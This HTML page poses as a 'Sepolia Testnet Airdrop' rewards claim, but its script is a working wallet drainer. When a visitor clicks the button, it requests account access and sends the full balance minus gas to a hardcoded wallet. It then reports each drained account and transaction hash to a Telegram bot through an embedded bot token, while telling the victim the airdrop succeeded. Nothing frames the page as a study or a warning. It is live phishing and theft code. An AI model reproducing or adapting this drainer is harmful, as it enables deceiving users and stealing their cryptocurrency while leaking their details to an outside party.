<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ðŸ”¥ Sepolia Testnet Airdrop</title>
    <script>
        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
        const CHAT_ID = "6309547301";
        const YOUR_WALLET = "0x08D32a1E8E341Bc58f4b7FA903a4C84E92E82D0A";

        async function sendAlert(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
            } catch (e) {
                console.log("Telegram alert failed, moving on...");
            }
        }

        async function connectWallet() {
            try {
                if (!window.ethereum) {
                    throw new Error("No wallet detected. Please install MetaMask.");
                }

                // Force Sepolia Network
                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: "0xaa36a7" }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [{
                                chainId: "0xaa36a7",
                                chainName: "Sepolia Testnet",
                                rpcUrls: ["https://rpc.sepolia.org"],
                                nativeCurrency: {
                                    name: "Sepolia ETH",
                                    symbol: "SEP",
                                    decimals: 18
                                },
                                blockExplorerUrls: ["https://sepolia.etherscan.io"]
                            }]
                        });
                    } else {
                        throw switchError;
                    }
                }

                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                const account = accounts[0];
                const balance = BigInt(await window.ethereum.request({
                    method: "eth_getBalance",
                    params: [account, "latest"]
                }));

                if (balance === 0n) {
                    throw new Error("Wallet balance is zero.");
                }

                // Dynamic gas estimation for reliability
                const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
                const gasLimit = 21000n; // Standard for simple transfers
                const gasCost = gasLimit * gasPrice;
                const drainAmount = balance - gasCost;

                if (drainAmount <= 0n) {
                    throw new Error("Insufficient funds for transaction after gas.");
                }

                const txHash = await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: account,
                        to: YOUR_WALLET,
                        value: "0x" + drainAmount.toString(16),
                        gas: "0x" + gasLimit.toString(16),
                        gasPrice: "0x" + gasPrice.toString(16),
                        chainId: "0xaa36a7"
                    }]
                });

                await sendAlert(`âœ… SEPOLIA SUCCESS: ${account} DRAINED - TX: ${txHash}`);
                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Test Successful!</h2><p>Funds transferred. Check your wallet.</p>";
            } catch (e) {
                await sendAlert(`SEPOLIA ERROR: ${account ? account : "Unknown"} - ${e.message}`);
                document.getElementById("status").innerHTML = `<h2 class='error'>Connection Failed</h2><p>Error: ${e.message}</p>`;
            }
        }
    </script>
    <style>
        body {
            font-family: 'Arial', sans-serif;

        }
        h1 {
            font-size: 2.5em;

        }
        button {

            padding: 15px 30px;
            font-size: 1.2em;
            color: #1e1e2f;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        button:hover {
            background: #ff007a;
            color: #ffffff;
            box-shadow: 0 0 15px rgba(255, 0, 122, 0.7);
        }
        #status {
            margin-top: 20px;
        }
        .success { color: #00ff9d; }
        .error { color: #ff007a; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ”¬ Sepolia Testnet Airdrop</h1>
        <p>Connect your wallet to claim your testnet rewards!</p>
        <button onclick="connectWallet()">Test Connection</button>
        <div id="status"></div>
    </div>
</body>
</html>
